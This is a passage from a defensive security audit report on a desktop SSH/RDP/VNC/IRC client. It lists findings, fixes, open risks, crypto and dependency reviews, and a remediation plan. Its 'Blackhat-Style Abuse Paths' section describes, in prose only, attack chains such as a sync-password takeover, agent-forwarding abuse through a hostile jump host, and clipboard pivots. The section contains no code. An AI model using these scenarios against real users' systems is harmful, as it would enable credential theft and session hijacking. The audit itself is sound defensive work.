Escape control characters and state the line count (done, with a test). Consider defaulting `allow_remote_clipboard` to off.

#### References
CWE-451.

### Finding ID: SEC-023 – SEC-042 (Low; fixed)

The following Low findings were fixed with the smallest change and, where practical, a test.

- **SEC-023, remote forwards on all interfaces.** An empty bind host now means `localhost`, matching `ssh -R`. Docs updated.
- **SEC-024, known-host lookup ignored key type.** Lookup is now per `(host, port, key_type)`; test `known_hosts_are_looked_up_per_key_type`.
- **SEC-025, unbounded auth rounds and missing timeouts.**
  - Keyboard-interactive is capped at 10 rounds.
  - Dials through jump hosts have timeouts.
  - `run_command` has a 30 s timeout.
- **SEC-026, handshake timeout vs host-key prompt.** The handshake timeout now includes the 60 s prompt window.
- **SEC-027, SFTP save dialog name.** The suggested name is sanitised with `safe_sftp_upload_name`.
- **SEC-028, IRC state growth.** At most 500 channels; CAP LS is ignored after registration and capped at 1000 capabilities; test `spoofed_self_joins_and_cap_floods_are_bounded`.
- **SEC-029, Telnet negotiation.** RFC 854 state tracking per option; NAWS doubles IAC; test `negotiation_replies_only_on_state_change`.
- **SEC-030, VNC starvation.** Queued input and a local close are serviced after every read.
- **SEC-031, non-UTF-8 environment.** `vars_os()` with lossy entries skipped.
- **SEC-032, print jobs.** Unique names created exclusively, at most 4 open; test extended.
- **SEC-033, secret read lifetime.** `Vault::get`/`Keychain::get`/`Secrets::get` return `Zeroizing<String>`; `has_sync_password` is cached for 5 s instead of fetching the secret every frame. Still open: egui `TextEdit` buffers and their undo history for the master, export and sync password fields (`settings.rs`, `transfer.rs`, `ssh_keys.rs`, `profile_editor.rs`).
- **SEC-034, legacy plaintext secrets.** Migration 009 runs `json_remove`, then VACUUM and a truncating WAL checkpoint; the test checks the raw DB and WAL bytes.
- **SEC-035, DB file mode.** `nexus.db` and its WAL/SHM are 0600; `PRAGMA secure_delete=ON`.
- **SEC-036, profile ids.** Restricted to `[A-Za-z0-9._-]{1,64}`, so ids can't collide in the `profile:<id>:<kind>` namespace.
- **SEC-037, host validation.** Hosts reject control characters and lengths over 253; jump, destination and bind hosts are validated.
- **SEC-038, `--answer`.** It and `NEXUS_ANSWERS` require `--screenshot`.
- **SEC-039, toast floods.** Toasts are de-duplicated and capped at 8.
- **SEC-040, `~/.ssh` mode.** Created with `create_private_dir` (0700); test asserts the mode.
- **SEC-041, PHP array parameters.** `is_string` guards; `nosniff`.
- **SEC-042, CI tooling.**
  - cargo-audit is pinned to 0.22.2, runs with `--deny yanked`, and also audits `fuzz/Cargo.lock`.
  - Fuzz runs use `-timeout=10`.
  - Checkouts don't persist credentials.

### Finding ID: SEC-043 – SEC-049 (Low/Info; open)

- **SEC-043, `rsa` Marvin (RUSTSEC-2023-0071) via russh.** No fixed release exists. The ignore in `rust/.cargo/audit.toml` carries a dated justification: one signature per user-initiated auth, and Ed25519 is the default. Re-check when `rsa` 0.10 final ships.
- **SEC-044, unbounded event channel.** Session output is queued without limit while the UI thread is blocked (for example inside a native file dialog). Fix: per-session byte budget and coalescing in the sink.
- **SEC-045, serial lock on the UI thread.** Serial write/break run on the UI thread under the port lock (5 s write timeout, 250 ms break sleep). Fix: a writer thread.
- **SEC-046, KDC dialled directly.** The Kerberos KDC is always dialled directly, even when the RDP session goes through a proxy or tunnel. This is documented in the manual. Route it through the same dial, or say so in the UI.
- **SEC-047, upstream SVC reassembly.** `ironrdp-svc` `dechunkify` ignores `totalLength`. Report upstream, or vendor-patch it with a cap.
- **SEC-048, keychain scope.** Keychain entries are per OS user, so instances with different `--data-dir` share `sync:password`. Accepted for compatibility.
- **SEC-049, vault format hardening.** Vault entries have no AAD binding them to their key name, and the export version byte isn't authenticated. Add both at the next format bump. Someone who can write `vault.json` can already edit `nexus.db`, so there is no privilege gain today.

### Finding ID: SEC-050 — Verified absent

- **Injection:** SQL injection (every query parameterised; `format!` only interpolates constant column lists); shell injection (the local shell is `argv[0]` only; no `ProxyCommand`/`LocalCommand`/`Include` execution in the ssh-config importer).
- **Path traversal:** recordings, key names, SFTP uploads and multi-file downloads, RDP shared folder (canonicalised, component-wise prefix check), print spool names.
- **TLS:** certificate verification is never disabled. IRC, GitHub, updater and RD Gateway use webpki roots with hostname checks. RDP's pinning verifier still checks the handshake signatures and compares SHA-256 of the leaf before any credentials are sent.
- **Host keys:** checked before authentication on every hop.
- **Randomness:** CSPRNG everywhere (`thread_rng`, `OsRng`).
- **Crypto choices:** Argon2id (128 MiB, t=3, p=4); AES-256-GCM with fresh random nonces and per-file salts; no MD5/SHA-1 in any security role on the client side (russh keeps `ssh-rsa` only as a last-resort host-key algorithm).
- **Constant-time comparisons:** no hand-rolled ones on secrets (only GCM tags).
- **Secrets in logs:** no secrets in tracing, the audit log, Diagnostics, or panic output.
- **Hardcoded secrets:** none in the history (all hits are vendored upstream test fixtures).
- **Unsafe code:** none outside tests (serial PTY test FFI) and the process-hardening syscalls.
- **Terminal reply leaks:** alacritty replies (DA, DSR, etc.) carry no user data; title-setting sequences are ignored.
- **Fuzzing:** artifact directories are empty (no unresolved crashes).

## 8. Blackhat-Style Abuse Paths

1. **Sync takeover.** Crack or steal the sync password from one machine, write a future-dated profile with a new host and an Insecure host-key policy, and wait for every machine's 10-minute tick. Before this run, saved passwords then went to the attacker forever. Now: timestamps are clipped (SEC-005) and retargeted credentials are forgotten (SEC-006). Still possible: login-script or agent-forwarding changes taking effect on the user's next click (SEC-021).
2. **Hostile bastion.** A user hops through an untrusted jump host with agent forwarding on for the target. The bastion opens agent channels and signs into the user's GitHub. Closed by SEC-008.
3. **One-line kill switches.** A hostile IRC server sends one line (SEC-003); a hostile VNC server sends one rectangle (SEC-002); any SSH server prints one link the user hovers (SEC-001). Each took down every open session. All closed.
4. **Clipboard pivot.** The RDP server reads the clipboard on focus (SEC-007), or an SSH host plants a multi-line clipboard behind a one-line toast (SEC-022) and the user pastes it into another tab without bracketed paste (SEC-010). All three are mitigated.
5. **Supply chain.** A compromised crate's build script in the release job pushes a release asset using the persisted write token. Closed (SEC-017). A compromised download host serving a trojan is open until signing (SEC-018).

## 9. Denial-of-Service and Resource Exhaustion Review

Fixed:

- VNC inflation and stream starvation (SEC-002, 030);
- IRC OSC stripping, line size, joins, CAP (SEC-003, 028);
- CA glob (SEC-004);
- inline images (SEC-011);
- RDP framebuffer, drive reads, print handles (SEC-012, 013, 032);
- Telnet amplification and wedging (SEC-015, 029);
- keyboard-interactive rounds and timeouts (SEC-025);
- toasts (SEC-039).

Open:

- unbounded event channel (SEC-044);
- serial writes on the UI thread (SEC-045);
- SVC reassembly upstream (SEC-047);
- the terminal find bar recomputes over the whole scrollback on every output chunk while open, and recording seek re-feeds from byte 0 per slider frame (functional; see the next-steps report);
- the RAW hex row cache is bounded by count, not bytes.

## 10. Cryptography and Key Management Review

- **At rest:** Argon2id v0x13 (m=128 MiB, t=3, p=4) → 32-byte key; AES-256-GCM, random 96-bit nonce per seal; 32-byte salt per vault, per password change, per export and per sync write.
- **Wrong-password handling:** a verifier blocks wrong master passwords; vaults without one are refused.
- **Master-password change:** atomic (temp file plus rename).
- **Harvest-now-decrypt-later:** at-rest formats are symmetric, so the bound is password entropy. The strength meter is heuristic.
- **In transit:**
  - TLS 1.2/1.3 via rustls with the ring provider and webpki roots. TLS 1.2 is kept deliberately for RDP to older Windows and many IRC networks.
  - SSH via russh 0.64.1 negotiates ML-KEM/X25519 hybrid key exchange first (post-quantum ready), with strict-kex.
  - RDP certificates are TOFU-pinned by SHA-256 of the leaf, checked before CredSSP. CredSSP binds the server public key.
- **Gaps:** unsigned updates (SEC-018); no AAD on vault entries (SEC-049); the `rsa` Marvin advisory (SEC-043).

## 11. Secrets Lifecycle and In-Memory Credential Review

- **Acquisition:** prompts use `Zeroizing` buffers. Remaining gap: egui `TextEdit` buffers and undo history on the master/export/sync/passphrase dialogs (SEC-033, open).
- **Storage:** keychain first, vault second. The sync password lives in the keychain. Login-script values are the remaining plaintext (SEC-020).
- **Use:** secret reads now return `Zeroizing`. The RDP connector `Config` and the gateway target keep plain `String` copies for the session's life (upstream types).
- **Propagation:** never logged; not in argv (SEC-038); `NEXUS_ANSWERS` is removed from the environment after reading.
- **Destruction:** profile delete purges keychain and vault; retargeted sync/import purges too (SEC-006).
- **Dumps:** release builds set `RLIMIT_CORE=0` and `PR_SET_DUMPABLE=0`. There are no heap-dump or debug endpoints (a desktop app).
- **Debug logging:** `RUST_LOG=debug` makes upstream IronRDP log NTLM blobs and RDPDR write data. Advise users before they share debug logs.

## 12. Memory and Resource Safety Review

- No `unsafe` in first-party non-test code except the documented hardening syscalls and the `remove_var` call made while still single-threaded.
- The vendored IronRDP session patches add bounds (`take`, `rect_fits`).
- All network parsers have explicit length caps; the gaps found are listed in §9.
- Allocation-before-validation was found and fixed in VNC (SEC-002), RDP (SEC-012, 013) and inline images (SEC-011).

## 13. Dependency and Supply-Chain Review

- **cargo audit:** 0 vulnerabilities. One allowed warning: `atomic-polyfill` unmaintained, pulled in only for non-host targets via sspi → winscard. The fuzz lockfile is now audited too.
- **Lockfile change in this run:** `webbrowser 1.2.4`, added by enabling eframe's own `links` feature. Without it, every "open in browser" was a silent no-op.
- **Pre-release crypto crates:** `rsa 0.10.0-rc.18`, `ssh-key 0.7.0-rc.11`, `pkcs1 0.8.0-rc.4`, `picky 7.0.0-rc.25`.
- **Duplicates:** 55 duplicated crates; nexus-core itself pins `rand 0.8`, `argon2 0.5`, `aes-gcm 0.10` while the graph has newer lines. Recommend bumping these to collapse the crypto duplicates.
- **Vendored crates:** the diffs match `vendor/README.md` exactly. There is no recorded tarball hash or patch file; recommend committing `.patch` files plus upstream sha256 and a CI check.
- **Actions:** pinned by SHA and verified. The new `download-artifact` SHA was verified against tag v4.3.0.
- **Tags:** not signed (`git tag -v v3.0.1` reports no signature).

## 14. Authentication and Authorisation Review

There is no multi-user authorisation model: it's a single-user desktop app. Authentication to remote systems:

- **SSH:** password, public key, keyboard-interactive and agent; user certificates are presented automatically; host certificates are checked for type, principal, CA, signature and validity (critical options, serials and KRLs are not checked, matching most clients).
- **RDP:** NLA via NTLM or Kerberos (see SEC-019).
- **VNC:** DES challenge, inherently weak. The SSH-tunnel warning stays.
- **IRC:** SASL PLAIN or NickServ, now TLS/tunnel/loopback only.
- **GitHub:** token over HTTPS only; loopback HTTP allowed for testing.

Local: the vault master password; the keychain is guarded by the OS.

## 15. Input Validation and Output Encoding Review

- Validation runs on create, update, quick connect, both import formats, sync and ssh-config import. It is stricter now (SEC-036, 037).
- Remote strings rendered by egui can't inject markup, but control characters were only shown escaped where it matters (paste preview, clipboard toast).
- IRC text is stripped of terminal escapes, linearly now.
- Recording files are bounded and parsed with serde.

## 16. Frontend HTML/JavaScript Robustness Review

Not applicable: there is no HTML or JavaScript. The UI is native egui. Equivalent robustness checks were done instead:

- **Panic paths:** SEC-001.
- **Event floods:** SEC-039, SEC-044.
- **Blocking work on the UI thread:** SEC-011, SEC-015, SEC-045.
- **Wedged dialogs:** see the next-steps report.
- **Dead feature:** link opening was silently a no-op until the `links` feature was enabled.

## 17. Infrastructure and Deployment Review

No servers or containers, except `updates/index.php`:

- traversal-safe (whitelist regex);
- `header()` rejects CRLF;
- output HTML-escaped;
- array parameters now handled.

The PHP still says "Alchementary Link Downloads" in two places (cosmetic).

The macOS app is ad-hoc signed, and the Windows binaries are unsigned (signing deferred).

## 18. Logging, Monitoring, and Error Handling Review

- **`nexus.log`:** 0600, rotated at 5 MiB, and contains no credentials or terminal bytes. Debug level pulls in upstream IronRDP detail (§11).
- **Audit log:** capped at 10 000 rows with no secret values. A new `secret.forget` entry records SEC-006 purges.
- **Swallowed errors worth fixing:**
  - a failed tombstone write in `delete_profile` means the deletion never propagates;
  - `Secrets::delete` ignores vault errors;
  - a `triggers.json` read error silently means "no rules".

## 19. Test Coverage and Security Regression Gaps

- **Added in this run:** 13 new regression tests and 4 extended ones; the suite went from 181 to 194 passing (3 ignored).
- **Still missing:**
  - a two-hop agent-forward integration test (SEC-008);
  - an RDP oversized-desktop test (SEC-012);
  - an RDPDR read-clamp test (SEC-013);
  - an RDP clipboard focus test (SEC-007);
  - migration fixtures from real older schemas (v1, v7);
  - import strategy tests (skip/overwrite/duplicate, duplicate ids in one batch, caps);
  - fuzz targets for `.cast` parsing, `known_hosts::parse`, `exportimport::open` and the JSON profile importer;
  - a VNC fuzz corpus seeded with valid zlib streams.

## 20. Prioritised Remediation Plan

- **Immediate:** done in this run; see §6, "Fixed".
- **Short term:**
  - SEC-019 (remember NLA per host and refuse downgrade);
  - SEC-021 (review or approve security-relevant synced changes);
  - SEC-033 remainder (zeroize egui password buffers and clear undoers on close);
  - SEC-044 (event budget).
- **Medium term:**
  - SEC-020 (login-script secrets in the secret store);
  - SEC-045 (serial writer thread);
  - SEC-047 (upstream SVC cap);
  - collapse duplicate crypto crates;
  - vendored-patch integrity check.
- **Long term:**
  - SEC-018 (sign manifests, binaries and tags, plus build provenance attestations);
  - per-machine signing of sync records;
  - SEC-049 (AAD at the next vault format bump).

## 21. False Positives / Needs Manual Verification

- **False positive: RD Gateway plus SSH tunnel bypassing the tunnel.** Validation already refuses that combination (`validation.rs`, the `gateway_host` block). Only the KDC direct dial remains (SEC-046).
- **Reported as broken, confirmed as such:** "Cmd+click opens links". It didn't open anything because eframe's `links` feature was missing. Fixed alongside SEC-001.
- **Needs manual verification:**
  - keychain behaviour on macOS and Windows for the `Zeroizing` change (API-compatible; not run on those OSes here);
  - the release workflow's new publish job on the next tag (YAML validated locally; GitHub Actions billing currently blocks all runs on this account);
  - IRC behaviour on real plaintext networks after SEC-014.
- **Severity judgement calls:** SEC-010 depends on the user's shell keybindings; SEC-012 depends on overcommit policy.

## 22. Final Notes

Residual risk:

- an unsigned update and download channel;
- a sync group where any member holding the password can still change how profiles behave;
- the opt-in RDP NLA downgrade;
- plaintext login-script values.

None of the open items allows remote compromise without user interaction or a trusted-peer compromise.

Limitations:

- no live testing against Windows RDP, RD Gateway, Kerberos, macOS or Windows keychains;
- GUI behaviour verified by code review, unit tests and one headless smoke run;
- CI could not run on GitHub because of an account billing block.

**Commits created** (all gated on fmt, clippy and the workspace tests):

| Commit | Scope |
|---|---|
| `76bd664` | sync timestamps, exclusive temp files, zeroized reads, `~/.ssh` mode, honest wording |
| `0bcfe64` | CA glob, per-hop forwarding gates, loopback remote forwards, key-interactive cap, timeouts, per-type host keys, SFTP name |
| `00f110f` | VNC inflate cap and pump, Telnet negotiation state and NAWS, socket write timeout and close, non-UTF-8 env |
| `d6f8f33` | link hover panic, paste and clipboard spoofing, image budget, toast cap, `links` feature |
| `7f3704e` | IRC OSC, line and state caps, no cleartext passwords, TcpConn close race |
| `eb8f08a` | RDP clipboard, allocation order, drive read clamp, print jobs |
| `13ca82a` | transactional migrations, migration 009, DB modes, `secure_delete`, id and host validation |
| `400d11e` | release least privilege, pinned audit, checksums, fuzz timeout, PHP |
| `c8ab4d6` | forget credentials on retarget, `--answer` restriction, docs |
